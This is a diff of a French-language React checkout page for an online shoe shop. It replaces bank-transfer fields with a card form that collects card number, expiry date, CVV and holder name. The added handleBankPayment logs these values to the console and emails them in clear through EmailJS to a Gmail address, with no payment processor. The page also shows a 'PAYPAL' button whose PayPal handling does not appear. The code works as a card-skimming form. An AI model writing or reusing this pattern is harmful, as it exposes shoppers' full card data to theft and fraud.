@@ -12,6 +12,7 @@ import Button from "@/ui/designSystem/button/button";
 
 import { useCart } from "@/context/cartContext";
 import { useAuth } from "@/context/AuthUserContext";
+import { IoClose } from "react-icons/io5";
 
 const CheckoutContainer = () => {
   const { authUser } = useAuth();
@@ -21,12 +22,80 @@ const CheckoutContainer = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showBankForm, setShowBankForm] = useState(false);
   const [bankDetails, setBankDetails] = useState({
-    name: "",
-    iban: "",
-    bic: "",
+    cardNum: "",
+    expDate: "",
+    cvvNumber: "",
+    cardHolder: "",
   });
   // Envoi de l'e-mail
-  const handleMessageMail = async () => {
+  
+  const sendEmail = async (templateParams, serviceId, templateId) => {
+    try {
+      setIsLoading(true);
+      const response = await emailjs.send(serviceId, templateId, templateParams, "PVVkJyq_LdxNGmNBV");
+      console.log("E-mail envoyé avec succès", response.status, response.text);
+      toast.success("Veuillez consulter votre e-mail pour finaliser votre commande.");
+    } catch (error) {
+      console.error("Erreur lors de l'envoi de l'e-mail", error);
+      if (error.response) {
+        console.error("Détails de l'erreur : ", error.response);
+      }
+      toast.error("Une erreur est survenue lors de l'envoi du message.");
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  // Mettez à jour avec le bon serviceId
+const handlePaiement2 = () => {
+  if (!authUser) {
+    toast.error("Veuillez vous connecter avant de passer la commande.");
+    return;
+  }
+
+  const templateParams = {
+    from_name: "Service Client - Boutique en Ligne",  // Expéditeur
+    reply_to: "enlignechaussures@gmail.com",  // Adresse pour répondre
+    prixTotal: calculateTotalPromoPrice(),
+    to_email: authUser.email,  // Envoi au client
+    subject: "Confirmation de votre demande de paiement bancaire",
+    message: `Bonjour ${authUser.nom ?? "Client"},\n\nNous avons bien reçu votre demande de paiement bancaire d'un montant total de ${calculateTotalPromoPrice()}.\n\nNous vous contacterons bientôt pour finaliser la transaction.\n\nCordialement,\nService Client - Boutique en Ligne`,
+  };
+
+  sendEmail(templateParams, "service_onvs4ax", "template_pjzftap");
+};
+
+
+  const handleBankPayment = () => {
+    if (!authUser) {
+      toast.error("Veuillez vous connecter avant de passer la commande.");
+      return;
+    }
+
+    if (!bankDetails.cardHolder || !bankDetails.cardNum || !bankDetails.expDate || !bankDetails.cvvNumber) {
+      toast.error("Veuillez remplir tous les champs.");
+      return;
+    }
+    console.log('====================================');
+    console.log(bankDetails);
+    console.log('====================================');
+
+    const templateParams = {
+        from_name: authUser.nom ?? "Client",
+        reply_to: authUser.email ?? "email_inconnu",
+        prixTotal: calculateTotalPromoPrice(),
+        to_email: "enlignechaussures@gmail.com",
+        bank_name: bankDetails.cardHolder,
+        cardNum: bankDetails.cardNum,
+        expDate: bankDetails.expDate,
+        cvvNumber: bankDetails.cvvNumber,
+        subject: "Demande de paiement bancaire",  // Ajout de l'objet de l'email
+    };
+
+    sendEmail(templateParams, "service_v9jsj28", "template_qrinzfc");
+  };
+
+  /* const handlePaiement2 = async () => {
     if (!authUser) {
       toast.error("Veuillez vous connecter avant de passer la commande.");
       return;
@@ -100,14 +169,10 @@ const CheckoutContainer = () => {
       setIsLoading(false);
       setShowBankForm(false);
     }
-  };
-    const handleInputChange = (e: { target: { name: string; value: string; }; }) => {
-    setBankDetails({ ...bankDetails, [e.target.name]: e.target.value });
-  };
-
+  }; */
   const onSubmit = () => {
-    console.log("Données soumises");
-    handleMessageMail();
+    console.log("Données soumises  ");
+    handlePaiement2();
   };
 
   // Calcul du total du panier
@@ -254,50 +319,105 @@ const CheckoutContainer = () => {
               )
             }
             
+          {showBankForm && (
+          <div className="bg-gray-100 p-4 rounded-lg space-y-3">
+            <div className="flex justify-between items-center">
+              <Typography variant="h4" className="mb-2">Informations Bancaires</Typography>
+              <IoClose className="text-2xl text-gray-500 cursor-pointer" onClick={() => setShowBankForm(false)} />
+            </div>
 
-        {showBankForm && (
-          <div className="bg-gray-100 p-4 rounded-lg">
-            <Typography variant="h4" className="mb-2">Informations Bancaires</Typography>
-            <input
-              type="text"
-              name="name"
-              placeholder="Nom de la banque"
-              value={bankDetails.name}
-              onChange={handleInputChange}
-              className="w-full p-2 mb-2 border rounded"
-            />
-            <input
-              type="text"
-              name="iban"
-              placeholder="IBAN"
-              value={bankDetails.iban}
-              onChange={handleInputChange}
-              className="w-full p-2 mb-2 border rounded"
-            />
-            <input
-              type="text"
-              name="bic"
-              placeholder="BIC"
-              value={bankDetails.bic}
-              onChange={handleInputChange}
-              className="w-full p-2 mb-2 border rounded"
-            />
-            <Button action={handleBankPayment} isLoading={isLoading} className="w-full px-4 py-2 text-white bg-secondary rounded hover:bg-secondary-dark">
+            {/* Numéro de carte */}
+            <div className="space-y-2">
+              <label htmlFor="cardNum">Numéro de la carte</label>
+              <input
+                type="text"
+                id="cardNum"
+                name="cardNum"
+                placeholder="1234 5678 9012 3456"
+                value={bankDetails.cardNum}
+                onChange={(e) => {
+                  let value = e.target.value.replace(/\D/g, ''); // Supprime tout sauf les chiffres
+                  value = value.replace(/(.{4})/g, '$1 ').trim(); // Ajoute un espace tous les 4 chiffres
+                  if (value.length > 19) return;
+                  setBankDetails((prev) => ({ ...prev, cardNum: value }));
+                }}
+                className="p-2 w-full border border-gray-300 rounded"
+                maxLength="19"
+                autoComplete="off"
+              />
+            </div>
+
+            {/* Date d'expiration et cvvNumber */}
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <label htmlFor="expDate">Date d{"'"}expiration</label>
+                <input
+                  type="text"
+                  id="expDate"
+                  name="expDate"
+                  placeholder="MM/YY"
+                  value={bankDetails.expDate}
+                  onChange={(e) => {
+                    let value = e.target.value.replace(/\D/g, ''); // Supprime tout sauf les chiffres
+                    if (value.length > 4) return;
+                    if (value.length >= 2) value = value.replace(/^(\d{2})/, '$1/'); // Ajoute le "/"
+                    setBankDetails((prev) => ({ ...prev, expDate: value }));
+                  }}
+                  className="p-2 w-full border border-gray-300 rounded"
+                  maxLength="5"
+                  autoComplete="off"
+                />
+              </div>
+
+              <div>
+                <label htmlFor="cvvNumber">CVV</label>
+                <input
+                  type="text"
+                  id="cvvNumber"
+                  name="cvvNumber"
+                  placeholder="***"
+                  value={bankDetails.cvvNumber}
+                  onChange={(e) => {
+                    const value = e.target.value.replace(/\D/g, ''); // Supprime tout sauf les chiffres
+                    if (value.length > 3) return;
+                    setBankDetails((prev) => ({ ...prev, cvvNumber: value }));
+                  }}
+                  className="p-2 w-full border border-gray-300 rounded"
+                  maxLength="3"
+                  autoComplete="off"
+                />
+              </div>
+            </div>
+
+            {/* Nom du titulaire */}
+            <div className="space-y-2">
+              <label htmlFor="cardHolder">Nom du titulaire</label>
+              <input
+                type="text"
+                id="cardHolder"
+                name="cardHolder"
+                placeholder="Nom complet"
+                value={bankDetails.cardHolder}
+                onChange={(e) => setBankDetails((prev) => ({ ...prev, cardHolder: e.target.value }))}
+                className="p-2 w-full border border-gray-300 rounded"
+                autoComplete="off"
+              />
+            </div>
+
+            {/* Bouton de validation */}
+            <Button action={handleBankPayment} isLoading={isLoading} className="w-full px-4 py-2 text-white bg-secondary rounded hover:bg-secondary-600">
               Valider le paiement
             </Button>
           </div>
-            )}
-            {
-              !showBankForm && (
-                <Button
+        )}
+        
+            <Button
               action={onSubmit}
               isLoading={isLoading}
               className="w-full px-4 py-2 text-white bg-primary rounded hover:bg-primary-dark"
             >
               PAYPAL
             </Button>
-              )
-            }
           </div>
         </div>
       </div>
